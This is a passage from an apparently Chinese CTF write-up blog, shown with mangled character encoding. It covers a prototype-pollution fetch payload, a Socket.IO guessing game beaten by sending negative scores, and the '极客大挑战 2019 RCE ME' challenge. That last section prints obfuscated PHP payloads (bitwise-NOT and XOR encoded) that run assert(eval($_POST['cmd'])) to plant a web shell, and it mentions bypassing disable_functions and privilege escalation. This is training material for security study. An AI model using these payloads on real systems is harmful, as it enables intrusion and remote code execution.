class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">  <span class="comment">// 4. æ ¸å¿ƒæ±¡æŸ“æ•°æ®ï¼ˆå›ºå®šï¼Œä¸ç”¨æ”¹ï¼‰</span></span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;set&quot;</span>,</span><br><span class="line">    <span class="string">&quot;point&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;amount&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;amount&quot;</span>: <span class="number">10000</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 5. è¯·æ±‚æˆåŠŸåï¼Œå¼¹çª—æ˜¾ç¤ºç»“æœï¼ˆå›ºå®šï¼Œä¸ç”¨æ”¹ï¼‰</span></span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;è¿”å›ç»“æœï¼š&quot;</span> + res))</span><br><span class="line"><span class="comment">// 6. è¯·æ±‚å¤±è´¥åï¼Œå¼¹çª—æ˜¾ç¤ºé”™è¯¯ï¼ˆå›ºå®šï¼Œä¸ç”¨æ”¹ï¼‰</span></span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;å‡ºé”™äº†ï¼š&quot;</span> + err));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="GuessOneGuess"><a href="#GuessOneGuess" class="headerlink" title="GuessOneGuess"></a>GuessOneGuess</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function(io) &#123;</span><br><span class="line">    io.on(&#x27;connection&#x27;, (socket) =&gt; &#123;</span><br><span class="line">        let targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">        let guessCount = 0;</span><br><span class="line">        let totalScore = 0;</span><br><span class="line">        const FLAG = process.env.FLAG || &quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;;</span><br><span class="line">        console.log(`æ–°è¿æ¥ - ç›®æ ‡æ•°å­—: $&#123;targetNumber&#125;`);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">        socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">            type: &#x27;welcome&#x27;,</span><br><span class="line">            message: &#x27;çŒœä¸€ä¸ª1-100ä¹‹é—´çš„æ•°å­—ï¼&#x27;,</span><br><span class="line">            score: totalScore</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        socket.on(&#x27;guess&#x27;, (data) =&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">              console.log(totalScore);</span><br><span class="line">                const guess = parseInt(data.value);</span><br><span class="line"></span><br><span class="line">                if (isNaN(guess)) &#123;</span><br><span class="line">                    throw new Error(&#x27;è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (guess &lt; 1 || guess &gt; 100) &#123;</span><br><span class="line">                    throw new Error(&#x27;è¯·è¾“å…¥1-100ä¹‹é—´çš„æ•°å­—&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                guessCount++;</span><br><span class="line"></span><br><span class="line">                if (guess === targetNumber) &#123;</span><br><span class="line">                   </span><br><span class="line">                    const currentScore = Math.floor(100 / Math.pow(2, guessCount - 1));</span><br><span class="line">                    totalScore += currentScore;</span><br><span class="line"></span><br><span class="line">                    let message = `ğŸ‰ çŒœå¯¹äº†ï¼å¾—åˆ† +$&#123;currentScore&#125; (æ€»åˆ†æ•°: $&#123;totalScore&#125;)`;</span><br><span class="line">                    let showFlag = false;</span><br><span class="line"></span><br><span class="line">                    if (totalScore &gt; 1.7976931348623157e308) &#123;</span><br><span class="line">                        message += `\nğŸ´ $&#123;FLAG&#125;`;</span><br><span class="line">                        showFlag = true;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                        type: &#x27;result&#x27;,</span><br><span class="line">                        win: true,</span><br><span class="line">                        message: message,</span><br><span class="line">                        score: totalScore,</span><br><span class="line">                        showFlag: showFlag,</span><br><span class="line">                        currentScore: currentScore</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line">                    targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">                    console.log(`æ–°ç›®æ ‡æ•°å­—: $&#123;targetNumber&#125;`);</span><br><span class="line">                    guessCount = 0;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if (guessCount &gt;= 100) &#123;</span><br><span class="line">                      console.log(&quot;100æ¬¡æœªçŒœä¸­ï¼å°†æ‰£é™¤å½“å‰åˆ†æ•°å¹¶é‡ç½®&quot;);</span><br><span class="line">                        socket.emit(&#x27;punishment&#x27;, &#123;</span><br><span class="line">                            message: &quot;100æ¬¡æœªçŒœä¸­ï¼å°†æ‰£é™¤å½“å‰åˆ†æ•°å¹¶é‡ç½®&quot;,</span><br><span class="line">                        &#125;);</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                        type: &#x27;result&#x27;,</span><br><span class="line">                        win: false,</span><br><span class="line">                        message: guess &lt; targetNumber ? &#x27;å¤ªå°äº†ï¼&#x27; : &#x27;å¤ªå¤§äº†ï¼&#x27;,</span><br><span class="line">                        score: totalScore</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (err) &#123;</span><br><span class="line">                socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                    type: &#x27;error&#x27;,</span><br><span class="line">                    message: err.message,</span><br><span class="line">                    score: totalScore</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        socket.on(&#x27;punishment-response&#x27;, (data) =&gt; &#123;</span><br><span class="line">          totalScore -= data.score;</span><br><span class="line">          guessCount = 0;</span><br><span class="line">          targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">          console.log(`æ–°ç›®æ ‡æ•°å­—: $&#123;targetNumber&#125;`);</span><br><span class="line">          socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">            type: &#x27;result&#x27;,</span><br><span class="line">            win: true,</span><br><span class="line">            message: &quot;æ‰£é™¤åˆ†æ•°å¹¶é‡ç½®&quot;,</span><br><span class="line">            score: totalScore,</span><br><span class="line">            showFlag: false,</span><br><span class="line">          &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<p>çœ‹å…³é”®ï¼Œshowflagä¸€ç›´æ˜¯falseï¼Œåªæœ‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (totalScore &gt; 1.7976931348623157e308) &#123;</span><br><span class="line">                        message += `\nğŸ´ $&#123;FLAG&#125;`;</span><br><span class="line">                        showFlag = true;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ†å¤§äºè¿™ä¸ªæ¶å¿ƒçš„æ•°å­—æ—¶æ‰ä¸ºtrue</p>
<p>JS æœ€å¤§æ­£å¸¸æ•°ï¼š<code>1.7976931348623157e308</code>ï¼ˆè®°ä¸ºã€Œæœ€å¤§å€¼ã€ï¼‰ï¼›</p>
<p>ä½†æ˜¯è§„åˆ™æœ‰ç‚¹ä¸ä¸€æ ·ï¼š</p>
<ol>
<li>åŠ åˆ†è§„åˆ™ï¼šçŒœä¸­æ‰åŠ åˆ†ï¼Œä½†å•æ¬¡å¾—åˆ†å°‘ï¼Œé æ­£å¸¸çŒœæ°¸è¿œåˆ°ä¸äº†ç›®æ ‡åˆ†æ•°ï¼›</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> currentScore = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">100</span> / <span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, guessCount - <span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>äººè¯ç¿»è¯‘ï¼š<ul>
<li><code>guessCount</code> &#x3D; ä½ çŒœä¸­æ•°å­—å‰çš„ã€Œæ€»çŒœæµ‹æ¬¡æ•°ã€ï¼ˆæ¯”å¦‚ 1 æ¬¡çŒœä¸­ï¼Œæ¬¡æ•°å°±æ˜¯ 1ï¼›5 æ¬¡çŒœä¸­ï¼Œæ¬¡æ•°å°±æ˜¯ 5ï¼‰ï¼›</li>
<li><code>Math.pow(2, n)</code> &#x3D; 2 çš„ n æ¬¡æ–¹ï¼ˆæ¯”å¦‚ 2Â¹&#x3D;2ï¼Œ2Â³&#x3D;8ï¼‰ï¼›</li>
<li><code>Math.floor()</code> &#x3D; å‘ä¸‹å–æ•´ï¼ˆåªä¿ç•™æ•´æ•°ï¼Œæ¯”å¦‚ 31.2â†’31ï¼‰ï¼›</li>
<li>æœ€ç»ˆå¾—åˆ† &#x3D; 100 Ã· (2 çš„ã€ŒçŒœä¸­æ¬¡æ•° - 1ã€æ¬¡æ–¹)ï¼Œå†å–æ•´ã€‚</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>çŒœä¸­æ¬¡æ•°</th>
<th>è®¡ç®—è¿‡ç¨‹</th>
<th>æœ¬æ¬¡å¾—åˆ†</th>
<th>æ€»åˆ†ï¼ˆå‡è®¾åˆå§‹ 0ï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td>1 æ¬¡çŒœä¸­</td>
<td>100 Ã· (2â°) &#x3D; 100 Ã· 1</td>
<td>100</td>
<td>100</td>
</tr>
<tr>
<td>2 æ¬¡çŒœä¸­</td>
<td>100 Ã· (2Â¹) &#x3D; 100 Ã· 2</td>
<td>50</td>
<td>50</td>
</tr>
<tr>
<td>3 æ¬¡çŒœä¸­</td>
<td>100 Ã· (2Â²) &#x3D; 100 Ã· 4</td>
<td>25</td>
<td>25</td>
</tr>
<tr>
<td>4 æ¬¡çŒœä¸­</td>
<td>100 Ã· (2Â³) &#x3D; 100 Ã· 8</td>
<td>12</td>
<td>12ï¼ˆ100&#x2F;8&#x3D;12.5â†’å–æ•´ 12ï¼‰</td>
</tr>
<tr>
<td>5 æ¬¡çŒœä¸­</td>
<td>100 Ã· (2â´) &#x3D; 100 Ã· 16</td>
<td>6</td>
<td>6ï¼ˆ100&#x2F;16&#x3D;6.25â†’å–æ•´ 6ï¼‰</td>
</tr>
<tr>
<td>10 æ¬¡çŒœä¸­</td>
<td>100 Ã· (2â¹) &#x3D; 100 Ã· 512</td>
<td>0</td>
<td>0ï¼ˆ100&#x2F;512â‰ˆ0.19â†’å–æ•´ 0ï¼‰</td>
</tr>
</tbody></table>
<ol>
<li>æ‰£åˆ†æ¼æ´ï¼šä¼ è´Ÿæ•°è®© â€œæ‰£åˆ†â€ å˜ â€œåŠ åˆ†â€ï¼Œå¤šæ¬¡ä¼ å°±èƒ½è®©æ€»åˆ†å˜æˆæ— ç©·å¤§ï¼›</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socket.on(&#x27;punishment-response&#x27;, (data) =&gt; &#123;</span><br><span class="line">          totalScore -= data.score;</span><br></pre></td></tr></table></figure>



<p>é‚£å°±ç©¿ä¸ªè´Ÿæ•°è¿›å»ï¼Œå¤šç©¿å‡ ä¸ªä¸ä¹…å¾ˆå¤§äº†å—</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æç®€ç‰ˆ - åˆ†è¡Œæ ¼å¼ï¼ˆæ ¸å¿ƒé€»è¾‘ä¸å˜ï¼‰</span></span><br><span class="line"><span class="keyword">const</span> s = <span class="title function_">io</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. åˆ·æ— ç©·å¤§æ€»åˆ†ï¼ˆ10æ¬¡è¶³å¤Ÿï¼‰</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">  s.<span class="title function_">emit</span>(<span class="string">&#x27;punishment-response&#x27;</span>, &#123; <span class="attr">score</span>: -<span class="number">1.5e308</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. è‡ªåŠ¨çŒœ1-100æ‰€æœ‰æ•°å­—</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> n=<span class="number">1</span>; n&lt;=<span class="number">100</span>; n++) &#123;</span><br><span class="line">  s.<span class="title function_">emit</span>(<span class="string">&#x27;guess&#x27;</span>, &#123; <span class="attr">value</span>: n &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. æŠ“åˆ°flagå°±å¼¹çª—</span></span><br><span class="line">s.<span class="title function_">on</span>(<span class="string">&#x27;game-message&#x27;</span>, <span class="function"><span class="params">d</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(d.<span class="property">message</span>?.<span class="title function_">includes</span>(<span class="string">&#x27;miniL&#x27;</span>)) <span class="title function_">alert</span>(d.<span class="property">message</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>







<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">io</span>) &#123; <span class="comment">// io æ˜¯ Socket.IO çš„æ ¸å¿ƒå¯¹è±¡</span></span><br><span class="line">    io.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> &#123; <span class="comment">// ç›‘å¬å®¢æˆ·ç«¯è¿æ¥ï¼ˆSocket.IO å›ºå®šå†™æ³•ï¼‰</span></span><br><span class="line">        socket.<span class="title function_">emit</span>(<span class="string">&#x27;game-message&#x27;</span>, &#123; ... &#125;); <span class="comment">// ç»™å®¢æˆ·ç«¯å‘æ¶ˆæ¯ï¼ˆemit = å‘é€ï¼‰</span></span><br><span class="line">        socket.<span class="title function_">on</span>(<span class="string">&#x27;guess&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123; ... &#125;); <span class="comment">// ç›‘å¬å®¢æˆ·ç«¯çš„&#x27;guess&#x27;äº‹ä»¶ï¼ˆon = æ¥æ”¶ï¼‰</span></span><br><span class="line">        socket.<span class="title function_">on</span>(<span class="string">&#x27;punishment-response&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123; ... &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>1.å‘ç° <code>io</code>ã€<code>socket.emit</code>ã€<code>socket.on</code> â†’ ç¡®å®šæ˜¯ Socket.IOï¼›</p>
<p>2.<code>socket.emit()</code>&#x2F;<code>socket.on()</code>ï¼Œå°±çŸ¥é“è¦æŒ‰ Socket.IO çš„æ–¹å¼ï¼ˆ<code>io()</code> å»ºè¿æ¥ã€<code>emit()</code> å‘è¯·æ±‚ï¼‰è§£é¢˜</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. å»ºç«‹è¿æ¥ï¼ˆå¿…å†™ï¼‰</span></span><br><span class="line"><span class="keyword">const</span> socket = <span class="title function_">io</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ç»™åç«¯å‘æ¶ˆæ¯ï¼ˆæŒ‰éœ€å†™ï¼‰</span></span><br><span class="line">socket.<span class="title function_">emit</span>(<span class="string">&#x27;äº‹ä»¶å&#x27;</span>, &#123; <span class="attr">key</span>: å€¼ &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ç›‘å¬åç«¯æ¶ˆæ¯ï¼ˆæŒ‰éœ€å†™ï¼‰</span></span><br><span class="line">socket.<span class="title function_">on</span>(<span class="string">&#x27;äº‹ä»¶å&#x27;</span>, <span class="function">(<span class="params">æ¥æ”¶çš„å‚æ•°</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// å¤„ç†æ”¶åˆ°çš„æ¶ˆæ¯ï¼ˆæ¯”å¦‚æ‹¿flagï¼‰</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>











<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;              //å­—æ•°é™åˆ¶</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>



<p>ä¸å…è®¸è¾“å…¥æ•°å­—å’Œå­—æ¯ã€‚</p>
<p>é‚£æ€ä¹ˆè®©evalæ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>å¯ä»¥ç”¨ä¸€ç§æ–¹å¼ï¼Œæˆ–è®¸å®ƒç¡®å®ä¸æ˜¯ç”±å­—æ¯å’Œæ•°å­—ç»„æˆï¼ˆmaybeä¸€äº›ç¬¦å·æ ‡ç‚¹ï¼Ÿï¼‰ï¼Œä½†æ˜¯ä»–è¡¨è¾¾å‡ºæ¥çš„æ„æ€ç¡®å®æ˜¯æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ï¼š</p>
<p>ä¸‰ç§æ–¹æ³•ï¼š</p>
<p>å–å</p>
<p>å¼‚æˆ–</p>
<p>è‡ªå¢</p>
<p>1.æˆ–è®¸ä½ å¯ä»¥å…ˆçœ‹çœ‹phpinfoæœ‰å“ªäº›å‡½æ•°è¢«ç¦ç”¨äº†ï¼ˆå…·ä½“æ„é€ çœ‹çŸ¥è¯†ç‚¹3ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=~%8f%97%8f%96%91%99%90;$_();</span><br></pre></td></tr></table></figure>

<p>systemè¢«ç¦ç”¨äº†</p>
<p><img src="/images/image-20251227163010489.png" alt="image-20251227163010489"></p>
<p>2.æ„é€ payload</p>
<p>evalä½œä¸ºä¸€ä¸ªè¯­è¨€æ„é€ å™¨ï¼Œå¹¶ä¸èƒ½è¢«å½“ä½œå‡½æ•°è°ƒç”¨ï¼Œ</p>
<p>æ¯”å¦‚ <code>eval()</code>ã€<code>echo()</code>ã€<code>isset()</code>ã€<code>include()</code>ã€‚ è¿™äº›ä¸æ˜¯å‡½æ•°ï¼Œè€Œæ˜¯ <strong>PHP æŒ‡ä»¤çš„ä¸€éƒ¨åˆ†</strong>ã€‚å®ƒä»¬åœ¨ä»£ç ç¼–è¯‘é˜¶æ®µå°±å·²ç»è¢«å›ºå®šæ­»äº†ã€‚å®ƒä»¬æ²¡æœ‰å…¥å£åœ°å€ï¼Œæ‰€ä»¥ä½ ä¸èƒ½ç”¨ <code>$a = &quot;eval&quot;; $a();</code> å»æ‰¾å®ƒã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬assertï¼ˆæƒ³äº†è§£è¿™ä¸ªå‡½æ•°å»çœ‹çŸ¥è¯†ç‚¹4ï¼‰</p>
<p>æ„é€ å‡ºç±»ä¼¼è¿™æ ·çš„payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(assert)(eval($_POST[&quot;cmd&quot;]))ï¼›</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%22%9e%8c%8c%9a%8d%8b%22)(~%22%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%dd%9c%92%9b%dd%a2%d6%22)ï¼›</span><br></pre></td></tr></table></figure>



<p>å¼‚æˆ–å¤ªé•¿äº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(%22%21%28%28%25%29%29%22^%22%40%5b%5b%40%5b%5d%22)(%22%25%28%21%2c%21%21%21%2b%40%28%28%24%21%23%2d%24%21%21%21%22^%22%40%5e%40%40%09%05%7e%7b%0f%7b%7c%7f%03%40%40%40%03%7c%08%22)</span><br></pre></td></tr></table></figure>





<p>3.è¿æ¥èšå‰‘ï¼Œ</p>
<p>å‘ç°flagå•¥éƒ½æ²¡æœ‰ï¼Œæ˜¯å› ä¸º</p>
<h3 id="1-æƒé™é™åˆ¶-Permission-Denied-â€”â€”-æœ€å¯èƒ½çš„åŸå› "><a href="#1-æƒé™é™åˆ¶-Permission-Denied-â€”â€”-æœ€å¯èƒ½çš„åŸå› " class="headerlink" title="1. æƒé™é™åˆ¶ (Permission Denied) â€”â€” æœ€å¯èƒ½çš„åŸå› "></a>1. æƒé™é™åˆ¶ (Permission Denied) â€”â€” <strong>æœ€å¯èƒ½çš„åŸå› </strong></h3><p>è¿™æ˜¯ CTF ä¸­æœ€å¸¸è§çš„å¥—è·¯ã€‚<code>/flag</code> æ–‡ä»¶ç¡®å®å­˜åœ¨ï¼Œä½†å®ƒçš„æƒé™è¢«è®¾ç½®æˆäº†åªæœ‰ <code>root</code> ç”¨æˆ·æ‰èƒ½è¯»å–ã€‚</p>
<ul>
<li><strong>å¦‚ä½•ç¡®è®¤</strong>ï¼šåœ¨èšå‰‘ç»ˆç«¯è¾“å…¥ <code>ls -l /flag</code>ã€‚</li>
<li><strong>çœ‹ç»“æœ</strong>ï¼š<ul>
<li>å¦‚æœæ˜¾ç¤º <code>-r-------- 1 root root</code>ï¼šè¯´æ˜åªæœ‰ root èƒ½è¯»ï¼Œä½ ï¼ˆwww-dataï¼‰æ²¡æƒé™ã€‚è¿™æ—¶å€™ä½ éœ€è¦å¯»æ‰¾<strong>ææƒ</strong>è·¯å¾„ï¼ˆæ¯”å¦‚å¯»æ‰¾åˆšæ‰æåˆ°çš„ <code>/readflag</code> ç¨‹åºï¼‰ã€‚</li>
<li>å¦‚æœæ˜¾ç¤º <code>-rwxr-xr-x</code>ï¼šè¯´æ˜ä½ å¯ä»¥è¯»ï¼Œä½†æ–‡ä»¶ä¾ç„¶ä¸ºç©ºï¼Œé‚£å¯èƒ½æ˜¯æ–‡ä»¶æœ¬èº«å°±è¢«æ¸…ç©ºäº†ï¼Œæˆ–è€… Flag åœ¨åˆ«å¤„ã€‚</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-å‡½æ•°è¢«ç¦ç”¨-Disable-Functions-â€”â€”-ç»•è¿‡é™åˆ¶"><a href="#2-å‡½æ•°è¢«ç¦ç”¨-Disable-Functions-â€”â€”-ç»•è¿‡é™åˆ¶" class="headerlink" title="2. å‡½æ•°è¢«ç¦ç”¨ (Disable Functions) â€”â€” ç»•è¿‡é™åˆ¶"></a>2. å‡½æ•°è¢«ç¦ç”¨ (Disable Functions) â€”â€” <strong>ç»•è¿‡é™åˆ¶</strong></h3><p>å¦‚æœä½ èƒ½çœ‹åˆ°æ–‡ä»¶ï¼Œæƒé™ä¹Ÿå¯¹ï¼Œä½†æ˜¯ <code>cat</code> å‘½ä»¤æˆ–è€…èšå‰‘çš„æ–‡ä»¶ç®¡ç†å™¨ç‚¹å¼€æ˜¯ç©ºçš„ï¼Œå¯èƒ½æ˜¯ PHP çš„é…ç½®æ–‡ä»¶ <code>php.ini</code> ç¦ç”¨äº†è¯»å–æ–‡ä»¶çš„å‡½æ•°ã€‚</p>
<ul>
<li><strong>å¦‚ä½•ç¡®è®¤</strong>ï¼šæŸ¥çœ‹ <code>phpinfo()</code>ï¼Œæœç´¢ <code>disable_functions</code> è¿™ä¸€é¡¹ã€‚</li>
<li><strong>å¸¸è§çš„â€œé˜‰å‰²â€åˆ—è¡¨</strong>ï¼šå¦‚æœé‡Œé¢å‡ºç°äº† <code>system</code>, <code>exec</code>, <code>passthru</code>, <code>shell_exec</code>, <code>file_get_contents</code> ç­‰ï¼Œè¯´æ˜ä½ æ— æ³•ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤è¯»æ–‡ä»¶ã€‚</li>
<li><strong>è¡¨ç°</strong>ï¼šä½ æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œè¿”å›ç»“æœä¸ºç©ºï¼Œæˆ–è€…æç¤º <code>function is disabled</code>ã€‚</li>
</ul>
<p><img src="/images/image-20251227201231091.png" alt="image-20251227201231091"></p>
